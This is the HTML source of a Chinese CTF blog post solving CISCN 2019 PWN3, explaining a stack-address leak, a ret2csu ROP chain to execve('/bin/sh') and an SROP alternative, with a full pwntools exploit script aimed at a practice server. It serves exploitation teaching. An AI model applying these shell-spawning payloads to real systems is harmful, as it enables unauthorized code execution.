@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="CISCN 2019华南 PWN3题目vuln函数  gadgets 解法这题有两种解法  csu srop  ret2csu .text:00000000004004E2 mov rax, 3Bh ; ‘;’.text:00000000004004E9 retn  程序中白给了一段gadgets，0x3b刚好对应execve，我们就可以调用它，然后通过rop构造另外三个参数 &#x2F;bin&#x2F;sh,0,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="srop">
+<meta property="og:url" content="http://example.com/2023/08/25/srop/index.html">
+<meta property="og:site_name" content="Dvgd">
+<meta property="og:description" content="CISCN 2019华南 PWN3题目vuln函数  gadgets 解法这题有两种解法  csu srop  ret2csu .text:00000000004004E2 mov rax, 3Bh ; ‘;’.text:00000000004004E9 retn  程序中白给了一段gadgets，0x3b刚好对应execve，我们就可以调用它，然后通过rop构造另外三个参数 &#x2F;bin&#x2F;sh,0,">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/srop/image-20230825214602232.png">
+<meta property="og:image" content="http://example.com/images/srop/image-20230825214644922.png">
+<meta property="og:image" content="http://example.com/images/srop/image-20230825214804758.png">
+<meta property="og:image" content="http://example.com/images/srop/hzpdmm.jpg">
+<meta property="og:image" content="http://example.com/images/srop/bzhrzq.jpg">
+<meta property="og:image" content="http://example.com/images/srop/epor0p.png">
+<meta property="article:published_time" content="2023-08-25T13:44:15.000Z">
+<meta property="article:modified_time" content="2023-08-25T13:48:12.035Z">
+<meta property="article:author" content="Dvgd">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/srop/image-20230825214602232.png">
+
+<link rel="canonical" href="http://example.com/2023/08/25/srop/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>srop | Dvgd</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Dvgd</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Dvgd</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">52</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/25/srop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          srop
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-25 21:44:15 / 修改时间：21:48:12" itemprop="dateCreated datePublished" datetime="2023-08-25T21:44:15+08:00">2023-08-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="CISCN-2019华南-PWN3"><a href="#CISCN-2019华南-PWN3" class="headerlink" title="CISCN 2019华南 PWN3"></a>CISCN 2019华南 PWN3</h1><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h5 id="vuln函数"><a href="#vuln函数" class="headerlink" title="vuln函数"></a>vuln函数</h5><p><img src="/../images/srop/image-20230825214602232.png" alt="image-20230825214602232"></p>
+<p><img src="/../images/srop/image-20230825214644922.png" alt="image-20230825214644922"></p>
+<h5 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h5><p><img src="/../images/srop/image-20230825214804758.png" alt="image-20230825214804758"></p>
+<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p><strong>这题有两种解法</strong></p>
+<ul>
+<li><strong>csu</strong></li>
+<li><strong>srop</strong></li>
+</ul>
+<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><blockquote>
+<p><strong>.text:00000000004004E2 mov rax, 3Bh ; ‘;’</strong><br><strong>.text:00000000004004E9 retn</strong></p>
+</blockquote>
+<p><strong>程序中白给了一段gadgets，0x3b刚好对应execve，我们就可以调用它，然后通过rop构造另外三个参数</strong></p>
+<p><strong><code>/bin/sh,0,0</code>分别对应<code>rdi, rsi, rdx</code></strong></p>
+<h2 id="leak-addr"><a href="#leak-addr" class="headerlink" title="leak addr"></a>leak addr</h2><p><strong>首先我们通过<code>sys_read</code>读入字符串，但是我们不知道其位置，只知道是在栈上，于是我们就要泄漏栈地址并且拿到字符串输入的地址</strong></p>
+<p><a target="_blank" rel="noopener" href="https://p.ipic.vip/hzpdmm.jpg"><img src="/../images/srop/hzpdmm.jpg" alt="img"></a></p>
+<p><strong>这里我们可以通过gdb可以发现，我们输入的地址距离栈基址的偏移是固定的0x118</strong></p>
+<p><a target="_blank" rel="noopener" href="https://p.ipic.vip/bzhrzq.jpg"><img src="/../images/srop/bzhrzq.jpg" alt="img"></a></p>
+<p><strong>write打印出0x30个字节，可以看出从低地址开始打印0x20个字节后0x8就是栈基址，所以我们构造</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1 = b&#x27;/bin/sh\x00&#x27; + b&#x27;b&#x27; * 8 + p64(vul_addr)</span><br><span class="line">sd(payload1)</span><br><span class="line">rv(0x20)</span><br><span class="line">bin_sh = u64(rv(8)) - 0x118</span><br><span class="line">ms(&#x27;bin_sh&#x27;, bin_sh)</span><br></pre></td></tr></table></figure>
+
+<p><strong>来泄漏出输入&#x2F;bin&#x2F;sh的地址，并且返回到vul函数，进行再一次的利用</strong></p>
+<h2 id="csu"><a href="#csu" class="headerlink" title="csu"></a>csu</h2><p><strong>之后就是打csu的部分了，这里可以去wiki上学习下或者参考其他师傅的wp</strong></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><strong>exp</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_s_3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_s_3&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29397</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : io.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : io.send(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> n : io.recv(n)</span><br><span class="line">rc = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> s : io.recvuntil(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ms</span>(<span class="params">name,addr</span>):</span><br><span class="line">    <span class="built_in">print</span>(name + <span class="string">&quot;----&gt;&quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">mallocr,PIE=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print &#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+mallocr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(mallocr)))</span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x0000000004004ED</span></span><br><span class="line">pop6_ret = <span class="number">0x00000000040059A</span></span><br><span class="line">mov3_call = <span class="number">0x0000000000400580</span></span><br><span class="line">execve_call = <span class="number">0x00000000004004E2</span></span><br><span class="line">sys_call = <span class="number">0x0000000000400517</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004005a3</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p64(vul_addr)</span><br><span class="line">sd(payload1)</span><br><span class="line">rv(<span class="number">0x20</span>)</span><br><span class="line">bin_sh = u64(rv(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">ms(<span class="string">&#x27;bin_sh&#x27;</span>, bin_sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># csu</span></span><br><span class="line">payload2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop6_ret)</span><br><span class="line">payload2 += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bin_sh+<span class="number">0x50</span>) + p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload2 += p64(mov3_call) + p64(execve_call)</span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_call)</span><br><span class="line">sd(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a><strong>signal机制</strong></h2><p><a target="_blank" rel="noopener" href="https://p.ipic.vip/epor0p.png"><img src="/../images/srop/epor0p.png" alt="Process of Signal Handlering"></a></p>
+<p><a target="_blank" rel="noopener" href="https://p.ipic.vip/epor0p.png">Process of Signal Handlering</a></p>
+<ol>
+<li>用户进程接到一个signal，将控制权给到内核层</li>
+<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及signal信息和sigreturn的系统调用地址</strong>，之后跳转到注册过的 signal handler 中处理相应的 signal</li>
+<li>执行完signal handler，就跳转到内核层</li>
+<li><strong>内核恢复2中保存的进程上下文，并把控制权给到用户层</strong></li>
+</ol>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p><strong>我们可以在恢复进程上下文的时候，构造一个fake_SigFrame，就能控制寄存器来劫持程序流程</strong></p>
+<p><strong>对于ctf题pwntools里是集成了框架,如上题</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sigreturn = 0x00000000004004DA</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = 59</span><br><span class="line">frame.rdi = bin_sh</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rip = sys_call</span><br><span class="line">payload2 = b&#x27;/bin/sh\x00&#x27; + p64(0) + p64(sigreturn) + p64(sys_call) + bytes(frame)</span><br><span class="line">sd(payload2)</span><br></pre></td></tr></table></figure>
+
+<p><strong>只需要改payload2那一部分，要注意指定<code>context.arch = &quot;amd64&quot;</code></strong></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/14/gdb%E6%96%87%E4%BB%B6%E8%BE%93%E5%85%A5/" rel="prev" title="gdb文件输入">
+      <i class="fa fa-chevron-left"></i> gdb文件输入
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/08/27/pwn%E7%9B%B2%E6%89%93/" rel="next" title="pwn盲打">
+      pwn盲打 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN-2019%E5%8D%8E%E5%8D%97-PWN3"><span class="nav-number">1.</span> <span class="nav-text">CISCN 2019华南 PWN3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">2.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#vuln%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.0.0.1.</span> <span class="nav-text">vuln函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#gadgets"><span class="nav-number">2.0.0.0.2.</span> <span class="nav-text">gadgets</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2csu"><span class="nav-number">4.</span> <span class="nav-text">ret2csu</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#leak-addr"><span class="nav-number">4.1.</span> <span class="nav-text">leak addr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#csu"><span class="nav-number">4.2.</span> <span class="nav-text">csu</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">4.3.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SROP"><span class="nav-number">5.</span> <span class="nav-text">SROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#signal%E6%9C%BA%E5%88%B6"><span class="nav-number">5.1.</span> <span class="nav-text">signal机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="nav-number">5.2.</span> <span class="nav-text">攻击思路</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Dvgd"
+      src="/images/Dvgd.jpg">
+  <p class="site-author-name" itemprop="name">Dvgd</p>
+  <div class="site-description" itemprop="description">Welcome to my blog.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yourname" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/yourname" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;yourname" rel="noopener" target="_blank"><i class="weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+	   <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1861579836&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Dvgd</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+</body>
+</html>
+<!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效2 -->
+<script type="text/javascript" src="/js/snow2.js"></script>
+
+<!-- 樱花特效 -->
+  
+      <script async src="/js/fairyDustCursor.js"></script>
+  
+
+
